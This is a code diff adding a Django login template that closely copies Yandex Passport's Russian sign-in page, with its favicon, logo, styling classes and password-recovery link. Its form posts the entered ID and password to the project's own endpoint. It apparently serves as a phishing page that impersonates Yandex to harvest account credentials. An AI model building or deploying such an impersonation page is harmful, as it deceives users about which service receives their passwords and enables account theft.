@@ -1,0 +1,104 @@
+{%load static%}
+<!DOCTYPE html>
+<html lang="ru" dir="ltr" data-page-type="react.authv2" class="is-js_yes is-inlinesvg_yes">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Авторизация</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge">
+    <link rel="shortcut icon" href="https://passport.yandex.ru/favicon.ico">
+    <meta name="pdb" content="disable">
+    <meta name="collections" content="disable">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/react.authv2.cij.css'%}">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/passport.auth.customs.css'%}">
+    
+</head>
+
+<body class="Theme_root_default Theme_color_yandex-default Theme_root_passport Theme_auth_domik"
+    data-metrics-id="784657" data-user-type="null" data-version="0.2.216-11" data-extended-logging="true">
+    <div id="root" class="layout">
+        <div class="passp-flex-wrapper">
+            
+            <div class="passp-page">
+                <div class="passp-bg passp-bg_7"></div>
+                <div class="passp-flex-wrapper">
+                    <div class="passp-content">
+                        <div class="passp-auth">
+                            <div class="passp-page-overlay"></div>
+                            <div class="passp-auth-content">
+                                <div class="Header">
+                                    <div class="Header-yaLogoBlock"><a href="https://yandex.ru/" tabindex="-1"
+                                            class="Logo Logo_ya"></a></div>
+                                </div>
+                                <div class="passp-page-visibility"></div>
+                                <div class="">
+                                    <div class="passp-route passp-route-appear-done passp-route-enter-done">
+                                        <div data-t="page:welcome" class="passp-auth-screen passp-welcome-page">
+                                            <h1 data-t="title" class="passp-title ">
+                                                <span>Войдите, чтобы продолжить</span>
+                                            </h1>
+                                            <div class="AuthPasswordForm">
+                                                <form method="post" action="{% url 'login' %}">
+                                                    {% csrf_token %}
+                                                    <div class="Field Field_view_big-input" data-t="field:login">
+                                                        <div class="Field-label-wrapper">
+                                                            <label class="Field-label" data-t="field:label-login" for="passp-field-login">Введите ваш ID</label>
+                                                        </div>
+                                                        {{ form.non_field_errors }}
+                                                        <span class="Textinput Textinput_view_big-input Textinput_size_l">
+                                                            {{ form.username.errors }}
+                                                            {{ form.username }}
+                                                            <!-- <input data-t="field:input-login" dir="ltr" autocorrect="off" autocapitalize="off" aria-invalid="false" autocomplete="username" class="Textinput-Control" id="passp-field-login" name="login" placeholder="Телефон или почта" type="text" value=""> -->
+                                                            <span class="Textinput-Box"></span>
+                                                        </span>
+                                                        <div class="Textinput-Line"></div>
+                                                       
+                                                    </div>
+
+                                                   
+                                                  
+                                                    <div class="Field Field_view_big-input" data-t="field:passwd">
+                                                        <div class="Field-label-wrapper"><label class="Field-label"
+                                                                data-t="field:label-passwd"
+                                                                for="passp-field-passwd">Введите пароль</label></div>
+                                                        <span class="Textinput Textinput_iconRight Textinput_view_big-input Textinput_size_l"><button
+                                                                class="Textinput-Icon Textinput-Icon_side_right Password-toggler Password-toggler_view_big-input"
+                                                                tabindex="2" type="button" title="Показать текст пароля"
+                                                                aria-label="Показать текст пароля"
+                                                                id="password-toggle"></button>
+                                                                {{ form.password.errors }}
+                                                                {{ form.password }}<span class="Textinput-Box"></span></span>
+                                                        <div class="Textinput-Line"></div>
+                                                        <div class="Field-link" data-t="field:link-passwd"
+                                                            id="field:link-passwd"><a data-t="link:default"
+                                                                href="https://passport.yandex.ru/restoration?retpath=https%3A%2F%2Fpassport.yandex.ru%2Fprofile&amp;&amp;process_uuid=5f4821dc-d982-4d76-85a4-8430ba66b097"
+                                                                weight="medium"
+                                                                class="Link Link_pseudo Link_view_default Link_weight_medium">Не&nbsp;помню
+                                                                пароль</a></div>
+                                                    </div>
+                                                    <div class="passp-button passp-sign-in-button">
+                                                        <input type="submit" id="passp:sign-in"
+                                                            class="Button2 Button2_size_l Button2_view_action Button2_width_max Button2_type_submit"
+                                                            aria-disabled="false" autocomplete="off" value="Войти"><span
+                                                                class="Button2-Text">Войти</span></div>
+                                                    
+                                                </form>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </div>
+                    </div>
+                </div>
+                <footer class="AuthFooter">
+                    
+                </footer>
+            </div>
+        </div>
+    </div>
+  </body>
+
+</html>
